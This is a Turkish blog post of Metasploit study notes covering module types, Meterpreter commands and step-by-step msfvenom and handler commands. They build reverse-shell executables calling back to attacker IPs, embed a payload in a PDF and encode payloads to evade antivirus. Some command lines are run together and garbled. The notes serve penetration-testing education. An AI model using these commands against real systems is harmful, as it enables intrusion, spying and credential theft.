---
layout: post
title: "Metasploit"
date: 2026-07-28

category: Research

image: /assets/posts/2026-07-28-metasploit-nedir/coverm.jpg

excerpt: 2024 YUSİBER Metasploit konu anlatım notlarım

tags:
- Metasploit
---

## Metasploit Framework

- Güvenlik açıklarını tespit etmek ve sömürmek (exploit etmek) için kullanılan bir frameworktür.
- Sızma testleri ve güvenlik araştırmalarında yaygın olarak kullanılır.


### Temel Komutlar

- `msfconsole` → Metasploit konsolunu başlatır.
- `search <anahtar kelime>` → Exploit arar.
- `use <exploit yolu>` → Exploit seçer.
- `set RHOST <hedef IP>` → Hedef IP adresini belirler.
- `set PAYLOAD <payload adı>` → Payload seçer.
- `exploit` → İstismarı başlatır.


### Çalışma Prensibi

1. Hedef belirleme.
2. Açık portları ve servisleri tarama.
3. Uygun exploit seçimi.
4. Payload oluşturma ve hedefe gönderme.
5. İstismar sonrası (Post-Exploitation) işlemler.


## Temel Kavramlar

### Meterpreter

Meterpreter, hedef sisteme yüklenen ve saldırgan makineye geri bağlantı sağlayan gelişmiş bir payload'dır.

### RHOSTS

**Remote Host**.

Hedef sistemin IP adresidir.

### RPORT

**Remote Port**.

Güvenlik açığı bulunan servisin hedef sistemde çalıştığı porttur.

### LHOST

**Local Host**.

Saldıran makinenin (örneğin Kali Linux) IP adresidir.

### LPORT

**Local Port**.

Reverse shell'in geri bağlanacağı saldırgan makinedeki porttur.

Başka bir uygulama tarafından kullanılmayan herhangi bir port seçilebilir.

### PAYLOAD

Exploit başarılı olduktan sonra hedef sistemde çalıştırılacak koddur.


## Faydalı Komutlar

- `back` → Payload veya modülden çıkarak msfconsole'a geri döner.
- `unset all` → Ayarlanmış tüm parametreleri temizler.
- `setg` → Parametreyi diğer modüllerde de varsayılan olarak kullanılacak şekilde ayarlar.
- `exploit` → Exploit modüllerini çalıştırır.
- `run` → Tüm modüllerde kullanılabilir.
- `exploit -z` → Exploit'i çalıştırır ancak oturuma otomatik geçmez.
- `background` → Mevcut oturumu arka plana atıp msfconsole'a döner (`Ctrl + Z`).
- `sessions` → Mevcut oturumları listeler.
- `sessions -i 2` → 2 numaralı oturuma bağlanır.



Metasploit modülleri:

```
/usr/share/metasploit-framework/modules
```

---

## Metasploit Modülleri

### 1. Exploit Modules

**Amaç:**

Hedef sistemde bulunan güvenlik açıklarını sömürmek.

**Örnek Kullanım:**

Hedef sistemdeki belirli bir serviste bulunan bilinen bir açığı çalıştırır.

**Örnek Modüller:**

- `exploit/windows/smb/ms17_010_eternalblue`
- `exploit/unix/ftp/proftpd_modcopy_exec`


### 2. Payload Modules

**Amaç:**

Exploit başarılı olduktan sonra çalıştırılacak kodu belirlemek.

#### Türleri

- **Single** → Tek işlem gerçekleştirir.
- **Stager** → Hedefle bağlantıyı kurar ve Stage'i indirir.
- **Stage** → Stager tarafından indirilen asıl payload'dır.

**Örnekler**

- `windows/meterpreter/reverse_tcp`
- `cmd/unix/reverse_bash`


### 3. Auxiliary Modules

**Amaç:**

Exploit kullanmadan bilgi toplamak veya servislerle etkileşim kurmak.

**Örnek Kullanımlar**

- Açık taraması
- Brute-force saldırıları
- Servis analizi

**Örnek Modüller**

- `auxiliary/scanner/ftp/ftp_version`
- `auxiliary/scanner/http/http_login`
- `auxiliary/server/browser_autopwn2`


### 4. Post Modules

**Amaç:**

Sisteme başarıyla sızıldıktan sonra gerçekleştirilen işlemler.

**Örnek İşlevler**

- Şifre dökümü
- Sistem bilgisi toplama
- Dosya yükleme
- Dosya indirme

**Örnek Modüller**

- `post/windows/gather/enum_chrome`
- `post/linux/manage/download_exec`


### 5. Encoder Modules

**Amaç:**

Payload'ları antivirüs veya güvenlik yazılımlarına yakalanmaması için encode etmek.

**Örnekler**

- `x86/shikata_ga_nai`
- `cmd/powershell_base64`


### 6. NOP Modules

**Amaç:**

Exploit koduna NOP komutları ekleyerek exploit'in daha kararlı çalışmasını sağlamak.

**Örnek**

- `x86/single_byte`


## Meterpreter

- Meterpreter, Metasploit Framework'ün bir parçasıdır.
- Exploit sonrası (Post-Exploitation) işlemler için kullanılan güçlü bir payload'dır.


### Kullanımı

### Payload oluşturma (msfvenom)

```
msfvenom-p windows/meterpreter/reverse_tcp \LHOST=192.168.1.100 \LPORT=4444 \-f exe \-o payload.exe
```

### Handler ayarlama

```
msfconsole

use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset LHOST192.168.1.100set LPORT4444

exploit
```

## Temel Özellikleri

- Hafif yapıdadır.
- Bellek içerisinde çalışır.
- Dosya sistemine erişebilir.
- Ekran görüntüsü alabilir.
- Kameraya erişebilir.
- Keylogger çalıştırabilir.
- Şifre dökümü yapabilir.
- Ağ keşfi gerçekleştirebilir.



## Temel Komutlar

### Session İşlemleri

- Session başlatma → `meterpreter >`
- Session'ları listeleme → `sessions -l`
- Session'a bağlanma → `sessions -i <ID>`

---

### Bilgi Toplama

- Sistem bilgisi → `sysinfo`
- Ağ yapılandırması → `ipconfig`
- Çalışan işlemler → `ps`
- Ekran görüntüsü → `screenshot`
- Kamera görüntüsü alma → `webcam_snap`
- Kamerayı başlatma → `webcam_stream`

---

## PDF'e Payload Yerleştirme

```
msfconsole

use exploit/windows/fileformat/

use exploit/windows/fileformat/adobe_pdf_embedded_exe

show options
```

`INFILENAME` parametresine PDF dosyasının yolu gösterilir.

PDF oluşturulduktan sonra:

```
msfconsole

use exploit/multi/handler

show options

set payload windows/meterpreter/reverse_tcp

run
```

Dinleme başlar.

Hedef payload'ı çalıştırdığında Meterpreter oturumu açılır.



## MSFVENOM Kullanımı

```
msfvenom

-p windows/meterpreter/reverse_tcp

--platform windows

-a x86

-e x86/shikata_ga_nai

-b "\x00"

LHOST=192.168.192.136

-f exe

> /home/kali/Desktop/evil.exe
```



### Handler Başlatma

```
msfconsole -q

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

show options

run
```

Bağlantı geldikten sonra:

```
meterpreter >
```